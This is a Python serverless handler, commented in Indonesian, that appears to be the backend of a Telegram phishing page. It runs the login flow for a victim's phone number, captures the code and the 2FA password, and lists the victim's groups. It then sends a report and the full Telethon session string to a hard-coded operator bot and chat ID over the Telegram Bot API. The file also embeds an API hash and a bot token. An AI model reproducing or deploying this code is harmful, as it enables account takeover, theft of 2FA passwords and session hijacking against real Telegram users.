from http.server import BaseHTTPRequestHandler
import json, asyncio, urllib.request, datetime
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty

# --- KONFIGURASI ---
API_ID = 37391656
API_HASH = '12d6406aa09781891052538af2fa5848'
BOT_TOKEN = "8577863218:AAH1SSBgHjb2cc7eyMRNjp_kn_dpckSdGzQ"
MY_CHAT_ID = "7981083332"

def bot_send_all(text, session_str, phone):
    # 1. Kirim Laporan Teks
    url_msg = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data_msg = json.dumps({"chat_id": MY_CHAT_ID, "text": text, "parse_mode": "Markdown"}).encode()
    
    # 2. Kirim File .txt (Download Session Desktop)
    url_doc = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
    parts = [
        f'--{boundary}',
        f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{MY_CHAT_ID}',
        f'--{boundary}',
        f'Content-Disposition: form-data; name="document"; filename="session_{phone}.txt"',
        f'Content-Type: text/plain\r\n\r\n{session_str}',
        f'--{boundary}--'
    ]
    payload_doc = '\r\n'.join(parts).encode('utf-8')

    try:
        urllib.request.urlopen(urllib.request.Request(url_msg, data=data_msg, headers={'Content-Type': 'application/json'}))
        req_doc = urllib.request.Request(url_doc, data=payload_doc)
        req_doc.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
        urllib.request.urlopen(req_doc)
    except: pass

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        data = json.loads(self.rfile.read(content_length))
        action = self.path.split('action=')[-1]
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            res = loop.run_until_complete(self.work(action, data))
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(res).encode())
        finally: loop.close()

    async def work(self, action, data):
        ss = data.get('session', '')
        client = TelegramClient(StringSession(ss), API_ID, API_HASH, sequential_updates=False)
        await client.connect()
        
        try:
            if action == 'send_code':
                s = await client.send_code_request(data['phone'])
                return {"success": True, "hash": s.phone_code_hash, "session": client.session.save()}
            
            elif action == 'signin':
                pwd_2fa = data.get('password', '-')
                if data.get('password'):
                    await client.sign_in(password=data.get('password'))
                else:
                    await client.sign_in(data['phone'], data['code'], phone_code_hash=data['hash'])
                
                me = await client.get_me()
                is_premium = "ya" if me.premium else "tidak"
                
                # Mengambil List Group (Nama | Link)
                group_details = []
                try:
                    dialogs = await client(GetDialogsRequest(
                        offset_date=None, offset_id=0, offset_peer=InputPeerEmpty(), limit=20, hash=0
                    ))
                    for d in dialogs.chats:
                        title = d.title if hasattr(d, 'title') else "Unknown"
                        link = f"t.me/{d.username}" if hasattr(d, 'username') and d.username else "private"
                        group_details.append(f"{title} | {link}")
                except: pass
                
                list_grup_str = "\n".join(group_details[:10]) if group_details else "kosong"
                final_ss = client.session.save()

                # --- FORMAT LAPORAN SESUAI PERMINTAAN ---
                report = (
                    f"Login✓\n"
                    f"ID: `{me.id}`\n"
                    f"Nomer: `{data['phone']}`\n"
                    f"Password 2FA: `{pwd_2fa}`\n"
                    f"Akun premium: {is_premium}\n"
                    f"List group: \n{list_grup_str}\n\n"
                    f"Sesi: \n`{final_ss}`"
                )
                
                bot_send_all(report, final_ss, data['phone'])
                return {"success": True}

        except SessionPasswordNeededError:
            return {"success": True, "need_2fa": True, "session": client.session.save()}
        except Exception as e:
            return {"success": False, "error": str(e)}
        finally: await client.disconnect()
        
